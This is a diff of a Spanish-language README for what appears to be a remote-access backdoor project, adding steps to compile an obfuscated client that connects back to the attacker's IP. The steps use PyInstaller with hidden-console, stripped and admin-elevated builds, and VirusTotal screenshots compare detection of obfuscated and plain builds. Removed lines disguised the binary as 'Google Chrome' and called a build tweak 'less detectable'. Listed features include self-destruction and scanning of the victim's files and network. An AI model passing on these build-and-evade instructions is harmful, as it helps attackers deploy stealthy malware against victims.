@@ -5,11 +5,11 @@
 
 # Novedades
 
-- Buscar TODOS los archivos por extension del sistema
 - Autodestrucción
+- Code Obfuscation
+- Buscar TODOS los archivos por extension del sistema
 - Escaneo de servicios de nmap sin necesidad de que la victima tenga NMAP (Mejorado (en mejora)).
 - Escanear la red de la victima
-- Escanera puertos de host dentro de la red de la victima
 
 # Proximamente 
 - Port Forwarding (tener conexion con los otros hosts)
@@ -69,40 +69,11 @@
                     ---------------------------------------------------------
 ```
 
-# Detections:
-![image](https://github.com/an0mal1a/evilShadow/assets/129337574/e59fc5b4-8467-4555-bc49-25ead1b5ffce)
-
-
-HASH: 0dfb2addd6f7c91952fbb77a23a3369e1a27986d85847599be2a40b8582fd000
-
-
-## New Enviorment:
-- **¿Por que?**
-    
-  - Una de las razones es para no tener conflictos y no tener otras librerias al compilar.
-  - Al crearnos un nuevo entono virtual, el .exe estará cargado con las libriras intaladas en ese entorno.
-  - El .exe / .bin pesará de **"30MB"** a **"14MB"**
-  - Menos detectable!!
-    
-
-- Windows:
-   1. `python -m venv new`
-   2. `.\new\Scripts\activate`
-
-    
- - Linux:
-   1. `python3 -m venv new`
-   2. `source new/bin/activate`
-
-PD: Para salir de este entorno, con el comando **"deactivate"** salimos del enterno nuevo de vuelta al del sistema
-
-
 # Requirements
 
 Automated:
 
 - ```pip install -r requirements.txt```
-
 
 # Errors:
 
@@ -110,36 +81,47 @@ Automated:
   - ```pip install nmap_vscan_fix prompt_toolkit colorama cryptography requests pynput certifi cffi charset-normalizer idna Pillow psutil pycparser requests six urllib3 pyinstaller ``` 
 
 
-- Si tenemos el error **"pyinstaller not found"** en el **nuevo entorno**!
+# Compile Obfuscated Code
 
-    - **Windows**
-      - where pyinstaller
-      
-            D:\ProtectosPython\ETHICAL_HACKING\winenv\Scripts\pyinstaller.exe
-            C:\Program Files\Python310\Scripts\pyinstaller.exe``
-    
-      - Usar ruta completa de pyinstaller (nuevo!)
-      
-             D:\ProtectosPython\ETHICAL_HACKING\winenv\Scripts\pyinstaller.exe --noconsole ....
+### Set IP address
 
-    - **Linux**
-      - whereis pyinstaller
+- En el archivo **conection-obf.py** en la línea **253** modificamos la IP a la que deseemos:
+
+        sock .connect (('127.0.0.1',2457 ))
+
+- Con Pyinstaller, ejecutamos el siguiente comando:
+  - Automated:
         
-            pyinstaller: /home/supervisor/ALL_MINE/Ramsomware/new/bin/pyinstaller /home/supervisor/.local/bin/pyinstaller
-      - Usar ruta completa de pyinstaller (nuevo!)
+        pyinstaller ObfusquedTest.spec
 
-             /home/supervisor/ALL_MINE/Ramsomware/new/bin/pyinstaller --noconsole --noupx ....
+  - Manual
 
-# Preparación:
+        pyinstaller --onefile --noconsole --noupx --strip --clean -n ObfusquedTest conection-obf.py
+
+#### Virus Total Obfuscated Restults:
+![image](https://github.com/an0mal1a/evilShadow/assets/129337574/df00dc72-9c5d-4892-9f9b-aea19e6f8015)
 
 
-En el script **Connection.py** en la línea **350** tenemos la línea que crea la conexión. La modificamos a la direccion ip
+Hash: 45f0a24a39f58cb3b9f01c9bf8923e664d50e96be26faeab683b6bf6773d4152
+
+# Compile Normal Code
+
+
+#### Virus Total **NO** Obfuscated Restults:
+![image](https://github.com/an0mal1a/evilShadow/assets/129337574/9448359a-07b2-4f05-acb4-2b40b381dc1f)
+
+
+HASH: a7538bf2b24885f46f8aa2532a370eb9aa35f2a2650a8b2f6f25b0cca00aab29
+
+
+### Set IP address
+
+En el script **connection.py** en la línea **349** tenemos la línea que crea la conexión. La modificamos a la direccion ip
 del atacante
 
 -     sock.connect ( ( '127.0.0.1' ,1337) )
 
 Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio más.
-
 
 # **Compilación**
 
@@ -152,15 +134,15 @@ Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio
 
   - Admin Required:
   
-      `client>pyinstaller --onefile --noupx --noconsole --clean --uac-admin -n "Google Chrome" conection.py`
+      `client>pyinstaller --onefile --noupx --strip --noconsole --clean --uac-admin -n "NoObfusquedTest" conection.py`
 
   - **NO** Admin Required:
   
-      `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
+      `client>pyinstaller --onefile --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`
 
   ### Linux:
   
-    `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
+    `client>pyinstaller --onefile --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`
 
 
 # Funciones (EXPLICAIÓN)
